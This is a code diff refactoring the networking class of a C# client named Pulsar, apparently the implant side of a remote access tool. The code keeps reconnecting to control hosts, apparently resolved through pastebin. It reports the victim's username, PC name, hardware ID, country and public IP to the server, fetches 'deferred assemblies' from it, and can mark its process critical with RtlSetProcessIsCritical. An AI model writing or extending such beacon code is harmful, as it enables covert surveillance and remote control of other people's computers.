@@ -21,229 +21,186 @@ namespace Pulsar.Client.Networking
 {
     public class PulsarClient : Client, IDisposable
     {
-        /// <summary>
-        /// Used to keep track if the client has been identified by the server.
-        /// </summary>
         private bool _identified;
-
-        /// <summary>
-        /// Indicates whether this client already requested deferred assemblies for the current session.
-        /// </summary>
         private bool _requestedDeferredAssemblies;
-
-        /// <summary>
-        /// The hosts manager which contains the available hosts to connect to.
-        /// </summary>
         private readonly HostsManager _hosts;
-
-        /// <summary>
-        /// Random number generator to slightly randomize the reconnection delay.
-        /// </summary>
         private readonly SafeRandom _random;
-
-        /// <summary>
-        /// Create a <see cref="_token"/> and signals cancellation.
-        /// </summary>
         private readonly CancellationTokenSource _tokenSource;
-
-        /// <summary>
-        /// The token to check for cancellation.
-        /// </summary>
         private readonly CancellationToken _token;
+        private volatile bool _shutdownRequested;
+        private bool _disposed;
 
-    /// <summary>
-    /// Indicates that shutdown was requested for the connect loop.
-    /// </summary>
-    private volatile bool _shutdownRequested;
-
-    /// <summary>
-    /// Tracks whether the instance was disposed to avoid double cleanup.
-    /// </summary>
-    private bool _disposed;
-
-        /// <summary>
-        /// Initializes a new instance of the <see cref="PulsarClient"/> class.
-        /// </summary>
-        /// <param name="hostsManager">The hosts manager which contains the available hosts to connect to.</param>
-        /// <param name="serverCertificate">The server certificate.</param>
         public PulsarClient(HostsManager hostsManager, X509Certificate2 serverCertificate)
             : base(serverCertificate)
         {
             _hosts = hostsManager;
             _random = new SafeRandom();
-            base.ClientState += OnClientState;
-            base.ClientRead += OnClientRead;
-            base.ClientFail += OnClientFail;
             _tokenSource = new CancellationTokenSource();
             _token = _tokenSource.Token;
+
+            ClientState += OnClientState;
+            ClientRead += OnClientRead;
+            ClientFail += OnClientFail;
         }
 
-        /// <summary>
-        /// Connection loop used to reconnect and keep the connection open.
-        /// </summary>
         public void ConnectLoop()
         {
             while (!_shutdownRequested && !_token.IsCancellationRequested)
             {
-                if (!Connected)
+                try
                 {
-                    var host = _hosts.GetNextHost();
-
-                    if (host?.IpAddress == null)
+                    if (!Connected)
                     {
-                        Debug.WriteLine("Failed to get a valid host to connect to. Will retry after delay.");
-                        
-                        // Check pastebin status to determine appropriate wait time
-                        var (IsReachable, SuggestedWaitTimeMs) = _hosts.GetPastebinStatus();
-                        int waitTime;
-                        
-                        if (!IsReachable && SuggestedWaitTimeMs > 0)
+                        var host = _hosts.GetNextHost();
+                        if (host?.IpAddress == null)
                         {
-                            // Use suggested wait time for pastebin failures (5+ minutes to avoid rate limiting)
-                            waitTime = SuggestedWaitTimeMs;
-                            Debug.WriteLine($"Pastebin unreachable, waiting {waitTime / 1000} seconds before retry");
+                            var status = _hosts.GetPastebinStatus();
+                            int wait = !status.IsReachable && status.SuggestedWaitTimeMs > 0
+                                ? status.SuggestedWaitTimeMs
+                                : Settings.RECONNECTDELAY;
+
+                            Thread.Sleep(wait + _random.Next(250, 750));
+                            continue;
                         }
-                        else
+
+                        try
                         {
-                            // Use normal reconnect delay when pastebin is reachable but no hosts available
-                            waitTime = Settings.RECONNECTDELAY;
+                            Connect(host.IpAddress, host.Port);
                         }
-                        
-                        Thread.Sleep(waitTime + _random.Next(250, 750));
-                        continue;
+                        catch (Exception ex)
+                        {
+                            Debug.WriteLine(ex.Message);
+                            CrashLogger.Log("PulsarClient.ConnectLoop.Connect", ex);
+                        }
                     }
 
-                    try
+                    while (Connected)
                     {
-                        base.Connect(host.IpAddress, host.Port);
+                        if (WaitForShutdownSignal(1000))
+                        {
+                            Disconnect();
+                            return;
+                        }
                     }
-                    catch (Exception ex)
-                    {
-                        Debug.WriteLine($"Connection attempt failed: {ex.Message}");
-                    }
-                }
 
-                while (Connected)
-                {
-                    if (WaitForShutdownSignal(1000))
+                    if (_shutdownRequested || _token.IsCancellationRequested)
+                    {
+                        Disconnect();
+                        return;
+                    }
+
+                    if (WaitForShutdownSignal(Settings.RECONNECTDELAY + _random.Next(250, 750)))
                     {
                         Disconnect();
                         return;
                     }
                 }
-
-                if (_shutdownRequested || _token.IsCancellationRequested)
+                catch (Exception ex)
                 {
+                    CrashLogger.Log("PulsarClient.ConnectLoop", ex);
                     Disconnect();
-                    return;
-                }
-
-                if (WaitForShutdownSignal(Settings.RECONNECTDELAY + _random.Next(250, 750)))
-                {
-                    Disconnect();
-                    return;
+                    Thread.Sleep(Settings.RECONNECTDELAY + _random.Next(250, 750));
                 }
             }
         }
 
-        private void OnClientRead(Client client, IMessage message, int messageLength)
+        private void OnClientRead(Client c, IMessage msg, int len)
         {
-            if (!_identified)
+            try
             {
-                if (message is ClientIdentificationResult reply)
+                if (!_identified)
                 {
-                    _identified = reply.Result;
-                    if (_identified)
-                    {
+                    if (msg is ClientIdentificationResult r && (_identified = r.Result))
                         RequestDeferredAssemblies();
-                    }
+                    return;
                 }
-                return;
+
+                MessageHandler.Process(c, msg);
             }
-
-            MessageHandler.Process(client, message);
+            catch (Exception ex)
+            {
+                CrashLogger.Log("PulsarClient.OnClientRead", ex);
+            }
         }
 
-        private void OnClientFail(Client client, Exception ex)
+        private void OnClientFail(Client c, Exception ex)
         {
-            Debug.WriteLine($"Client Fail - Exception Message: {ex.Message}");
-            client.Disconnect();
+            Debug.WriteLine(ex.Message);
+            CrashLogger.Log("PulsarClient.OnClientFail", ex);
+            c.Disconnect();
         }
 
-        private void OnClientState(Client client, bool connected)
+        private void OnClientState(Client c, bool connected)
         {
-            _identified = false; // always reset identification
+            _identified = false;
             _requestedDeferredAssemblies = false;
 
-            if (connected)
+            if (!connected) return;
+
+            _hosts.NotifySuccessfulConnection();
+
+            var geo = GeoInformationFactory.GetGeoInformation();
+            var ua = new UserAccount();
+
+            try
             {
-                // Notify hosts manager of successful connection for pastebin timing logic
-                _hosts.NotifySuccessfulConnection();
-                
-                // send client identification once connected
-
-                var geoInfo = GeoInformationFactory.GetGeoInformation();
-                var userAccount = new UserAccount();
-
-                var identification = new ClientIdentification
+                c.Send(new ClientIdentification
                 {
                     Version = Settings.ReportedVersion,
                     OperatingSystem = PlatformHelper.FullName,
-                    AccountType = userAccount.Type.ToString(),
-                    Country = geoInfo.Country,
-                    CountryCode = geoInfo.CountryCode,
-                    ImageIndex = geoInfo.ImageIndex,
+                    AccountType = ua.Type.ToString(),
+                    Country = geo.Country,
+                    CountryCode = geo.CountryCode,
+                    ImageIndex = geo.ImageIndex,
                     Id = HardwareDevices.HardwareId,
-                    Username = userAccount.UserName,
+                    Username = ua.UserName,
                     PcName = SystemHelper.GetPcName(),
                     Tag = Settings.TAG,
                     EncryptionKey = Settings.ENCRYPTIONKEY,
                     Signature = Convert.FromBase64String(Settings.SERVERSIGNATURE),
-                    PublicIP = geoInfo.IpAddress ?? "Unknown"
-                };
-
-                client.Send(identification);
+                    PublicIP = geo.IpAddress ?? "Unknown"
+                });
+            }
+            catch (Exception ex)
+            {
+                CrashLogger.Log("PulsarClient.OnClientState.SendIdentification", ex);
             }
         }
 
         private void RequestDeferredAssemblies()
         {
-            if (_requestedDeferredAssemblies)
-            {
-                return;
-            }
+            if (_requestedDeferredAssemblies) return;
 
-            var missingAssemblies = DeferredAssemblyManager.GetMissingAssemblies();
-            if (missingAssemblies == null || missingAssemblies.Length == 0)
-            {
-                return;
-            }
+            var missing = DeferredAssemblyManager.GetMissingAssemblies();
+            if (missing == null || missing.Length == 0) return;
 
             try
             {
                 Send(new RequestDeferredAssemblies
                 {
-                    Assemblies = missingAssemblies,
+                    Assemblies = missing,
                     ClientVersion = Settings.ReportedVersion
                 });
 
                 _requestedDeferredAssemblies = true;
-                Debug.WriteLine($"Requested {missingAssemblies.Length} deferred assemblies from server.");
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Failed to request deferred assemblies: {ex.Message}");
+                Debug.WriteLine(ex.Message);
+                CrashLogger.Log("PulsarClient.RequestDeferredAssemblies", ex);
             }
         }
 
-        /// <summary>
-        /// Stops the connection loop and disconnects the connection.
-        /// </summary>
         public void Exit()
         {
-            if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
+            try
             {
-                NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
+                if (Settings.MAKEPROCESSCRITICAL && UAC.IsAdministrator())
+                    NativeMethods.RtlSetProcessIsCritical(0, 0, 0);
+            }
+            catch (Exception ex)
+            {
+                CrashLogger.Log("PulsarClient.Exit.RtlSetProcessIsCritical", ex);
             }
 
             _shutdownRequested = true;
@@ -253,19 +210,19 @@ namespace Pulsar.Client.Networking
 
         protected override void Dispose(bool disposing)
         {
-            if (!disposing || _disposed)
-            {
-                return;
-            }
+            if (!disposing || _disposed) return;
 
-            _shutdownRequested = true;
             _disposed = true;
+            _shutdownRequested = true;
 
             _tokenSource.Cancel();
-
             try
             {
                 base.Dispose(disposing);
+            }
+            catch (Exception ex)
+            {
+                CrashLogger.Log("PulsarClient.Dispose.base", ex);
             }
             finally
             {
@@ -273,21 +230,16 @@ namespace Pulsar.Client.Networking
             }
         }
 
-        /// <summary>
-        /// Waits for either a shutdown request/cancellation or until the specified timeout elapses.
-        /// </summary>
-        /// <param name="timeoutMs">Timeout in milliseconds.</param>
-        /// <returns><c>true</c> if shutdown was requested; otherwise <c>false</c>.</returns>
-        private bool WaitForShutdownSignal(int timeoutMs)
+        private bool WaitForShutdownSignal(int ms)
         {
-            const int slice = 100;
+            var slice = 100;
             var waited = 0;
 
-            while (waited < timeoutMs && !_shutdownRequested && !_token.IsCancellationRequested)
+            while (waited < ms && !_shutdownRequested && !_token.IsCancellationRequested)
             {
-                var delay = Math.Min(slice, timeoutMs - waited);
-                Thread.Sleep(delay);
-                waited += delay;
+                var d = Math.Min(slice, ms - waited);
+                Thread.Sleep(d);
+                waited += d;
             }
 
             return _shutdownRequested || _token.IsCancellationRequested;
